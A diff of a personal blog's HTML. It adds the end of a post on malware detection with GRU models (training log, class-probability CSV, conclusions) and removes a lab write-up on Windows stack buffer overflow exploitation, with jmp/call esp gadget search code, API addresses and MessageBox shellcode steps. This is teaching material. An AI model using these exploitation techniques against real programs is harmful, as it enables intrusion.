+<p>   Epoch 20/20<br>   Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:28&lt;00:00,  1.52it/s]<br>   Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.03it/s]<br>   Train Loss: 0.5044, Train Accuracy: 0.8467<br>   Validation Loss: 0.5578, Validation Accuracy: 0.8366<br>   Model saved!<br>   d:\chen_hao\病毒检测机器学习\RNN.py:146: FutureWarning: You are using <code>torch.load</code> with <code>weights_only=False</code> (the current default value), which uses the default pickle module implicitly. It is possible to construct malicious pickle data which will execute arbitrary code during unpickling (See <a target="_blank" rel="noopener" href="https://github.com/pytorch/pytorch/blob/main/SECURITY.md#untrusted-models">https://github.com/pytorch/pytorch/blob/main/SECURITY.md#untrusted-models</a> for more details). In a future release, the default value for <code>weights_only</code> will be flipped to <code>True</code>. This limits the functions that could be executed during unpickling. Arbitrary objects will no longer be allowed to be loaded via this mode unless they are explicitly allowlisted by the user via <code>torch.serialization.add_safe_globals</code>. We recommend you start setting <code>weights_only=True</code> for any use case where you don’t have full control of the loaded file. Please open an issue on GitHub for any issues related to this experimental feature.<br>     model.load_state_dict(torch.load(‘best_gru_model.pth’))<br>   Testing: 100%|███████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 51/51 [00:25<00:00,  2.01it/s] 
+   预测完成并保存至 pytorch_gru_submission.csv
+   PS D:\chen_hao\病毒检测机器学习><br>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#123;% asset_img image-20241212143434312.png image-20241212123845251 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% asset_img image-20241212144205267.png image-20241212144205267 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% asset_img image-20241213005217419.png image-20241213005217419 %&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>   file_id,prob0,prob1,prob2,prob3,prob4,prob5,prob6,prob7<br>   1,0.06448878,0.002397979,0.9028775,0.0013381493,0.00045697886,0.0020659335,0.003058874,0.023315739<br>   2,0.9813138,8.656157e-05,0.0029583538,0.0011351788,0.00028997194,0.006586187,0.0018473516,0.005782577<br>   3,0.99163276,5.5359196e-05,0.0027402057,0.0004632939,0.000118531985,0.0013870831,0.00072588393,0.0028768326<br>   4,0.021272896,0.011765718,0.024904,0.076123476,0.015064285,0.025066515,0.17768894,0.6481142<br>   5,0.904939,0.00073774875,0.04147379,0.002916103,0.0005452043,0.0022994527,0.007011477,0.040077265<br>   6,0.0021798164,0.0007873667,0.0014384006,0.0027823928,0.00244751,0.9728891,0.011387657,0.006087801<br>   7,0.0068255765,0.017928587,0.0011721165,0.5918627,0.028887965,0.08608816,0.065764345,0.20147054<br>   8,0.256366,0.00392755,0.17083807,0.03653748,0.0030841657,0.014288423,0.043775067,0.4711833<br>   9,0.036793254,0.010180762,0.07269347,0.028041216,0.007907337,0.014224959,0.1945642,0.6355948<br>   10,0.25146127,0.0009808545,0.0032455756,0.375254,0.008948095,0.1938656,0.042228147,0.124016486<br>   11,0.00095530774,0.09089262,0.001956982,0.0021283366,0.0098222485,0.88708365,0.004995707,0.0021652123<br>   12,0.9000948,0.00055806845,0.07364376,0.0017178208,0.00039910257,0.0030469508,0.0031312718,0.017408215<br>   13,0.9858329,7.062489e-05,0.002319975,0.00074456446,0.00021577052,0.0051714894,0.0013318722,0.0043128696<br>   14,0.71485704,0.0018635483,0.1835684,0.0046869554,0.00093834405,0.0039504743,0.012158039,0.07797725<br>   15,0.95209205,0.00034266696,0.024804827,0.0013410876,0.00033840715,0.002777113,0.0031649894,0.015138777<br>   16,0.9988642,6.826462e-05,0.0005704778,5.0490657e-05,5.821846e-05,1.5237126e-05,5.5164932e-05,0.00031797035<br>   17,0.00090827956,0.0009387416,0.0012451294,0.00543124,0.003330927,0.96512026,0.014691722,0.008333769<br>   18,0.01809039,0.0010136849,0.0009486259,0.55183834,0.017171165,0.17679921,0.012343813,0.22179477<br>   19,0.9777029,0.00014269094,0.0092709325,0.0011368245,0.000268385,0.003403238,0.0015272632,0.006547669<br>   20,0.9926167,4.7670434e-05,0.002156556,0.00042129072,0.000109387,0.0013140069,0.0006860488,0.0026483978<br>   21,0.9420716,0.00025259246,0.010330827,0.0035953792,0.0003313114,0.013363041,0.002719807,0.027335435<br>   22,0.010564044,0.013456773,0.013810868,0.10937901,0.023766087,0.07066154,0.2242378,0.53412384<br>   23,0.0074043795,0.0237848,0.8829586,0.016059525,0.012664877,0.015524606,0.0027832955,0.03881999<br>   24,0.7460677,0.0016432973,0.16402717,0.0043358603,0.0008404788,0.003432122,0.010673889,0.06897949<br>   ```</p>
+<h4 id="总结与展望"><a href="#总结与展望" class="headerlink" title="总结与展望"></a>总结与展望</h4><ol>
+<li><strong>实验结论</strong>：<ul>
+<li><strong>勒索病毒</strong>：设计了一个简单的勒索病毒Demo，揭示其文件加密与解密原理。</li>
+<li><strong>机器学习</strong>：使用LightGBM结合TF-IDF特征，模型性能优秀，适合快速检测。</li>
+<li><strong>深度学习</strong>：GRU模型对复杂API序列分类效果更优，适合进一步研究。</li>
+</ul>
+</li>
+<li><strong>优化方向</strong>：<ul>
+<li>引入更复杂的注意力机制，加强深度学习模型对序列数据的理解。</li>
+<li>数据增强，扩展训练数据多样性，提升模型泛化能力。</li>
+<li>结合机器学习和深度学习结果进行模型融合，进一步提升检测与分类性能。</li>
+</ul>
+</li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -4215,496 +4765,9 @@
 
 
 
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://moyuan10086.github.io/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="moyuan">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Moyuan"s website">
-      <meta itemprop="description" content="prograing or coffee">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | Moyuan"s website">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/" class="post-title-link" itemprop="url">实训记录</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2024-02-01 02:00:18" itemprop="dateCreated datePublished" datetime="2024-02-01T02:00:18+08:00">2024-02-01</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2024-08-29 03:03:42" itemprop="dateModified" datetime="2024-08-29T03:03:42+08:00">2024-08-29</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="实训1-项目名称：-缓冲区溢出利用"><a href="#实训1-项目名称：-缓冲区溢出利用" class="headerlink" title="实训1 项目名称：   缓冲区溢出利用"></a>实训1 项目名称：   缓冲区溢出利用</h2><h3 id="一、环境及工具"><a href="#一、环境及工具" class="headerlink" title="一、环境及工具"></a>一、环境及工具</h3><h4 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h4><ul>
-<li>实验环境：Windows操作系统，使用Dev-C++ 5.11进行编译</li>
-<li>设备：个人计算机</li>
-<li>前置知识：C/C++编程基础，汇编语言基础，操作系统原理，网络安全基础</li>
-<li>必要的课程：计算机安全，网络安全</li>
-<li>说明：本实验旨在通过实践操作，深入理解缓冲区溢出的原理和利用方法，掌握编写和执行shellcode的基本技能。</li>
-<li>推荐的文章链接：(<a target="_blank" rel="noopener" href="https://www.cnblogs.com/02SWD/p/15952483.html">缓冲区溢出漏洞的原理及其利用实战 - 浅易深 - 博客园 (cnblogs.com)</a>)</li>
-</ul>
-<h4 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h4><ul>
-<li><p><strong>C/C++编程基础</strong>：理解数组、指针、字符串处理函数（如strcpy）的使用，以及函数调用过程中栈帧的变化。</p>
-</li>
-<li><p><strong>操作系统原理</strong>：了解进程和线程的基本概念，以及内存管理中的堆、栈、代码区和数据区。</p>
-</li>
-<li><p><strong>汇编语言基础</strong>：能够阅读和理解简单的汇编代码，了解寄存器的作用和常见的汇编指令。</p>
-</li>
-<li><p><strong>调试工具的使用</strong>：熟悉使用OllyDbg、IDA Pro等调试工具来分析程序的执行过程和内存布局。</p>
-</li>
-<li><p><strong>安全编程概念</strong>：了解缓冲区溢出漏洞的成因，以及如何通过安全编程实践来预防这类漏洞。</p>
-</li>
-<li><p><strong>Windows API函数</strong>：对于Windows平台，需要了解如何使用MessageBoxA、ExitProcess等API函数。</p>
-</li>
-<li><p><strong>Shellcode编写</strong>：理解如何编写简单的shellcode来执行特定的系统调用，如弹出对话框。</p>
-</li>
-<li><p><strong>动态链接库（DLL）和函数地址获取</strong>：了解如何在程序中加载DLL并获取特定函数的地址。</p>
-</li>
-<li><p><strong>操作系统保护机制</strong>：了解现代操作系统中用于防御缓冲区溢出的机制，如数据执行保护（DEP）和地址空间布局随机化（ASLR）。</p>
-</li>
-<li><p>Linux，x86体系结构，x86汇编，C语言，gdb</p>
-<ul>
-<li><p><a target="_blank" rel="noopener" href="https://github.com/YuZhang/Security-Courseware/blob/master/buffer-overflow/supplements/PC-Assembly-Language.pdf">PC Assembly Language</a></p>
-</li>
-<li><p><a target="_blank" rel="noopener" href="https://github.com/YuZhang/Security-Courseware/blob/master/buffer-overflow/supplements/gcc-x86-Assembly.pdf">gcc x86 Assembly Quick Reference</a></p>
-</li>
-<li><p><a target="_blank" rel="noopener" href="https://github.com/YuZhang/Security-Courseware/blob/master/buffer-overflow/supplements/gdb-refcard.pdf">GDB Quick Reference</a></p>
-</li>
-</ul>
-</li>
-</ul>
-<ul>
-<li><strong>缓冲区溢出（buffer overflow）</strong>：在计算机安全和程序设计中的一种异常，当一个程序向缓冲区写入数据时，超出了缓冲区边界并且覆盖了相邻内存。</li>
-<li><p><strong>调用栈（call stack）</strong>：用于存储程序中运行子例程信息的栈数据结构，先入后出。</p>
-</li>
-<li><p><strong>栈缓冲区溢出（stack buffer overflow）</strong>：程序向调用栈中原本缓冲区之外的内存地址写入数据，意图获取对指令指针的控制，将其指向恶意代码。</p>
-</li>
-</ul>
-<h4 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h4><ol>
-<li><strong>环境搭建</strong>：确保操作系统和编译器已正确安装，调试工具OllyDbg和IDA Pro已配置好。</li>
-<li><strong>知识复习</strong>：回顾C/C++编程基础，特别是数组和指针的使用，以及操作系统中堆栈的工作原理。</li>
-<li><strong>实验目的</strong>：明确实验的目标是理解和掌握缓冲区溢出攻击的原理和方法。</li>
-<li><strong>实验内容</strong>：详细阅读实验指导书，了解实验步骤和预期结果。</li>
-<li><strong>参考资料</strong>：查阅相关文献和网络资源，如<a target="_blank" rel="noopener" href="https://www.sojson.com/ascii.html">缓冲区溢出利用实验遇到的几个问题</a>，为实验提供理论支持。</li>
-</ol>
-<h4 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理"></a>实验原理</h4><p>缓冲区溢出是一种常见的软件安全漏洞，它发生在程序处理输入数据时，没有正确检查数据的长度，导致数据超出了分配给该数据的内存空间，从而覆盖了相邻的内存区域。这种溢出可以破坏程序的正常执行流程，甚至允许攻击者执行任意代码。在实验中，我们将通过编写一个存在缓冲区溢出漏洞的程序，然后利用这个漏洞来执行我们控制的代码，例如弹出一个警告对话框。</p>
-<p>缓冲区溢出漏洞的实验原理基于程序在处理输入数据时的缺陷。在C/C++程序中，如果使用如strcpy这样的函数来复制字符串到一个固定大小的缓冲区，而没有检查字符串的长度，那么当输入的字符串超过缓冲区的大小时，多余的数据就会溢出到相邻的内存区域。这个相邻的内存区域可能包含程序的返回地址，如果攻击者能够控制这个返回地址，就可以让程序执行攻击者指定的代码，这就是所谓的“控制流劫持”。</p>
-<p>在实验中，我们会创建一个简单的程序，该程序包含一个易受攻击的函数，该函数会接收用户输入并将其复制到一个固定大小的缓冲区。然后，我们会构造一个特殊的输入字符串，使其长度超过缓冲区的大小，从而触发溢出。通过精心构造这个字符串，我们可以覆盖返回地址，使其指向我们准备的shellcode。当程序执行到返回指令时，它会跳转到shellcode的地址，执行我们注入的代码。</p>
-<p>通过往程序的缓冲区写超出其长度的内容，造成缓冲区的溢出，从而破坏程序的堆栈，进而运行精心准备的指令，以达到攻击的目的。  </p>
-<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/v2-1b6a999604597d4bdc536eb59c2955aa_b.jpg" class="">
-<p>如上图，程序的缓冲区比作一个个格子（内存单元），每个格子中存放不同的东西，有的是命令，有的是数据，当程序需要接收用户数据，程序预先为之分配了4个格子（上图中黄色的0~3号格子）。</p>
-<p>按照程序设计，就是要求用户输入的数据不超过4个。</p>
-<p>而用户在输入数据时，假设输入了16个数据，而且程序也没有对用户输入数据的多少进行检查（这种情况太常见了，windows系统本身就出过n个缓冲区溢出漏洞），就往预先分配的格子中存放，这样不仅4个分配的格子(内存)被使用了，其后相邻的12个格子中的内容都被新数据覆盖。  </p>
-<p>一般情况下后面的格子是可以被当成代码执行的，嘿嘿，那么好玩的事情来了，我们可以精心制造一段指令，比如格式化硬盘指令来让cpu执行。</p>
-<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/v2-48df59365aad345eb680d0da0cc56ab3_b.jpg" class="">
-<p>堆栈溢出是如何形成的？</p>
-<p>简单来说，堆栈溢出就是把大缓冲区中的数据向小缓冲区中复制，由于没有关注小缓冲区的边界，“撑爆”了较小的缓冲区，从而冲掉了小缓冲区和邻内区域的其他数据而引起的内存问题。在具体描述堆栈溢出之前我们先来了解一下 Linux 程序在内存中的结构：</p>
-<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240829030133682.png" class="" title="image-20240829030133682">
-<p>其中共享区也称为 data 区，用来存储可执行代码；.text 和 .bss 均用来存储程序的全局变量和初始化变量；堆则不随函数消亡而消亡，而是直到程序消亡或手动释放才会消亡；堆栈是随着函数分配并消亡的，堆栈溢出就是出现在堆栈区中的缓冲区安全问题。 </p>
-<p>堆栈是一个后进先出（LIFO）数据结构，往低地址增长，它保存本地变量、函数调用等信息。随着函数调用层数的增加，栈帧会向低地址方向延伸；随着进程中函数调用层数的减少，即各函数的返回，栈帧会一块一块地被遗弃而向内存的高地址方向回缩。各函数的栈帧大小随着函数的性质不同而不等。 </p>
-<p>堆栈这种数据结构，常见操作有压栈（PUSH）、弹栈（POP）；用于标识栈的属性有：栈顶（TOP）、栈底（BASE）。 </p>
-<p>其中：</p>
-<p>◈ PUSH：为栈增加一个元素的操作叫做 PUSH，相当于插入一块；</p>
-<p>◈ POP：从栈中取出一个元素的操作叫做 POP；</p>
-<p>◈ TOP：TOP 标识栈顶的位置，且是动态变化的，每做一次 PUSH 操作，它会自 +1；每做一次 POP 操作，它会自 -1；</p>
-<p>◈ BASE：BASE 标识栈底位置，用于防止栈空后继续弹栈，一般来说BASE位置不发生改变。</p>
-<p>下面以 main 函数叠加 A 和 B 函数为例说明整个压栈和弹栈过程：</p>
-<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240829030045795.png" class="" title="image-20240829030045795">
-<p>Main 函数调用 A 函数，把 A 函数中的变量添加到堆栈区内，开辟大小和变量指定大小相关。同样 B 函数在被调用后也会把变量添加到堆栈区内，开辟指定大小空间给 B 区域变量使用。</p>
-<p>◈如果其中任意一个变量存入的值超过设计的界定，就会导致值覆盖其他变量的区域最终污染到函数返回地址区域。一旦函数的返回地址被污染，在进行弹栈的过程中会最终把跳转的地址指向黑客所指定的区域，或根本不存在的区域。</p>
-<p>◈如果覆盖函数返回地址的是一组随机值，则程序会跳转到未知位置，这种情况往往最终会导致整个程序崩溃。</p>
-<p>◈如果黑客构造足够精细的 shellcode，把跳转地址指向黑客自己注入的代码，则很可能会利用该漏洞获得当前用户的控制权限。</p>
-<h4 id="实验概述"><a href="#实验概述" class="headerlink" title="实验概述"></a>实验概述</h4><ul>
-<li><strong>实验目的</strong>：通过模拟缓冲区溢出攻击，理解其原理，掌握利用方法。</li>
-<li><strong>实验要求</strong>：编写程序实现缓冲区溢出，执行特定功能（如弹出MessageBox警告框）。</li>
-<li><strong>实验原理</strong>：利用程序在处理输入时未正确检查缓冲区大小，导致数据溢出到相邻内存区域，覆盖关键数据（如返回地址），从而控制程序流程。</li>
-</ul>
-<h4 id="实验中可能出现的问题"><a href="#实验中可能出现的问题" class="headerlink" title="实验中可能出现的问题"></a>实验中可能出现的问题</h4><ol>
-<li><p><strong>编译器优化</strong>：某些编译器可能会对代码进行优化，这可能会改变程序的内存布局，使得溢出攻击更加困难。例如，编译器可能会将局部变量移动到堆上，或者在编译时自动插入安全检查。</p>
-</li>
-<li><p><strong>栈保护机制</strong>：现代操作系统和编译器可能会启用栈保护机制，如StackGuard或ProPolice，这些机制会检测并阻止栈溢出。</p>
-</li>
-<li><p><strong>地址随机化</strong>：地址空间布局随机化（ASLR）会随机化程序和库在内存中的位置，使得预测shellcode的执行地址变得困难。</p>
-</li>
-<li><p><strong>数据执行保护</strong>：数据执行保护（DEP）会标记某些内存区域为不可执行，阻止攻击者执行注入的代码。</p>
-</li>
-<li><p><strong>调试器干扰</strong>：在调试过程中，调试器可能会改变程序的执行行为，例如通过断点或单步执行，这可能会影响溢出攻击的成功率。</p>
-</li>
-<li><p><strong>shellcode兼容性</strong>：编写的shellcode需要与目标系统的架构（如x86或x64）兼容，并且需要考虑到目标系统上的特定API函数地址。</p>
-</li>
-<li><p><strong>错误处理</strong>：程序可能会有错误处理逻辑，如异常处理，这可能会在溢出发生时执行，从而影响攻击的执行流程。</p>
-</li>
-<li><p><strong>环境差异</strong>：不同的操作系统版本、编译器版本和系统配置可能会导致实验结果不一致。</p>
-</li>
-</ol>
-<p>为了成功完成实验，实验者需要对上述问题有所了解，并在实验设计中考虑到这些潜在的障碍。通过实验，实验者将能够更深入地理解缓冲区溢出的原理，并学会如何识别和利用这类漏洞。</p>
-<h3 id="二、实训流程及分析"><a href="#二、实训流程及分析" class="headerlink" title="二、实训流程及分析"></a>二、实训流程及分析</h3><p><strong>关键步骤</strong></p>
-<ol>
-<li><strong>精确定位返回地址的位置</strong>：通过调试工具分析程序执行过程中的堆栈变化，确定函数返回地址在堆栈中的具体位置。</li>
-<li><strong>寻找合适的地址覆盖原始地址</strong>：使用动态链接库（如user32.dll）中的跳转指令（如jmp esp）来找到一个合适的地址，以便将控制流引导到我们的shellcode。</li>
-<li><strong>编写shellcode到相应的缓冲区中</strong>：编写shellcode并将其放置在合适的内存位置，以便在覆盖后的地址执行。</li>
-</ol>
-<p>特别说明：在本实训中，我们将攻击代码（即MessageBox弹窗警告）直接写在jmp esp或call esp地址后面。这是因为jmp esp指令会跳转到栈指针（ESP）指向的地址执行代码，而我们的shellcode正好位于这个位置。这种方法可以确保在栈溢出时，执行流被重定向到我们控制的代码区域。</p>
-<p><strong>精确定位返回地址</strong></p>
-<ol>
-<li><p><strong>编译模式对比</strong>：首先，我们对比了不同编译模式下的栈空间分配。在debug模式下，编译器会为数组预留更多的空间，这可能会影响返回地址的定位。通过使用OllyDbg，我们观察了不同编译模式下返回地址的位置，以确保我们能够准确定位到目标地址。</p>
-</li>
-<li><p><strong>调试程序源码分析</strong>：我们编写了一个简单的调试程序，使用32bit-debug模式编译。通过观察程序执行后返回地址的内容，我们确定了返回地址的确切位置。</p>
-</li>
-<li><p><strong>ESP和EBP的入栈</strong>：在程序执行过程中，我们观察到ESP和EBP的值会入栈。这为我们提供了一个参考点，以便在后续步骤中确定正确的地址。</p>
-</li>
-</ol>
-<p><strong>寻找合适的跳转地址</strong></p>
-<ol>
-<li><p><strong>jmp esp(call esp)的利用</strong>：我们利用了jmp esp(call esp)指令的特性，这种指令允许程序跳转到ESP寄存器指向的地址。通过搜索kernel32.dll，我们找到了一些call esp的地址，这些地址可以被用来实现跳转。</p>
-</li>
-<li><p><strong>user32.dll的加载</strong>：由于MessageBoxA函数需要user32.dll动态链接库，我们必须确保主程序加载了这个库。否则，MessageBoxA调用将失败。</p>
-</li>
-</ol>
-<p><strong>编写shellcode并执行</strong></p>
-<ol>
-<li><p><strong>shellcode编写</strong>：我们编写了一个简单的shellcode，其目的是调用MessageBoxA函数来弹出警告框。这个shellcode需要被放置在程序的缓冲区中，以便在溢出时执行。</p>
-</li>
-<li><p><strong>攻击代码的放置</strong>：我们将shellcode直接写在jmp esp或者call esp地址后面，这样做的原因是，一旦jmp esp或call esp指令被执行，程序的控制流将跳转到ESP寄存器指向的地址，即我们的shellcode。这样，我们就可以控制程序执行我们想要的代码，而不是返回到原始的返回地址。</p>
-</li>
-<li><p><strong>程序执行</strong>：在程序执行过程中，我们通过溢出输入，覆盖了返回地址，使其指向我们的shellcode。当程序执行到返回指令时，它将跳转到shellcode，执行我们定义的操作（弹出MessageBoxA）。</p>
-</li>
-</ol>
-<p><strong>遇到的问题</strong></p>
-<ol>
-<li><p><strong>编译器的嵌套堆栈保护</strong>：在某些编译器版本中，如Dev-C++ 5.11，存在嵌套堆栈的保护机制。这会使得溢出后无法直接返回到我们想要的地址。为了解决这个问题，我们采用了几种方法：预留出足够的空间来覆盖嵌套堆栈，直接在动态调试器中修改汇编指令，或者更换编译器版本。</p>
-</li>
-<li><p><strong>调试器报错</strong>：在使用Dev-C++ 5.11编译时，我们在“__try”处遇到了报错。这提示我们需要更换编译器，或者使用其他等价的函数来避免错误。</p>
-</li>
-<li><p><strong>动态链接库的加载问题</strong>：在未正确加载user32.dll的情况下，MessageBoxA调用会失败。这要求我们在编写shellcode之前确保所有必要的动态链接库都被正确加载。</p>
-</li>
-</ol>
-<p>通过这些步骤和对问题的解决，我们成功地实现了缓冲区溢出攻击，并且弹出了MessageBoxA警告框。这个过程不仅加深了我们对缓冲区溢出原理的理解，也提高了我们在实际环境中识别和利用此类漏洞的能力。</p>
-<p><strong>具体操作</strong></p>
-<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141647865.png" class="" title="image-20240131141647865">
-<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141659202.png" class="" title="image-20240131141659202">
-<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141706938.png" class="" title="image-20240131141706938">
-<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141713797.png" class="" title="image-20240131141713797">
-<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141723487.png" class="" title="image-20240131141723487">
-<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141733407.png" class="" title="image-20240131141733407">
-<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141740142.png" class="" title="image-20240131141740142">
-<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141752071.png" class="" title="image-20240131141752071">
-<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141800874.png" class="" title="image-20240131141800874">
-<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141808492.png" class="" title="image-20240131141808492">
-<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141816283.png" class="" title="image-20240131141816283">
-<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141825548.png" class="" title="image-20240131141825548">
-<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141833223.png" class="" title="image-20240131141833223">
-<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141841368.png" class="" title="image-20240131141841368">
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user32=<span class="number">0x763f0000</span></span><br><span class="line">ExitProcess= <span class="number">0x764174d0</span>                                                                                 </span><br></pre></td></tr></table></figure>
-<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141851414.png" class="" title="image-20240131141851414">
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user32=<span class="number">0x75880000</span>                                                                                         MessageBoxA= <span class="number">0x758fa110</span></span><br></pre></td></tr></table></figure>
-<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141859074.png" class="" title="image-20240131141859074">
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span> </span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HINSTANCE hHandle = <span class="built_in">LoadLibrary</span>(<span class="string">&quot;user32.dll&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(!hHandle)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;LoadLibrary Error!&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	BYTE* ptr =(BYTE*)hHandle;</span><br><span class="line">	<span class="type">int</span> address;</span><br><span class="line">	BOOL done_Flag=<span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;!done_Flag;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		</span><br><span class="line">		__try</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (ptr[i] == <span class="number">0xFF</span> &amp;&amp; ptr[i + <span class="number">1</span>] == <span class="number">0xD4</span>)  <span class="comment">//jmp esp FFE4 ;  call esp FFD4</span></span><br><span class="line">				&#123;</span><br><span class="line">					address = (<span class="type">int</span>)ptr+i;</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">&quot;OPCODE found at 0x%x\n&quot;</span>,address);</span><br><span class="line">				&#125;</span><br><span class="line">				</span><br><span class="line">				</span><br><span class="line">			&#125;</span><br><span class="line">		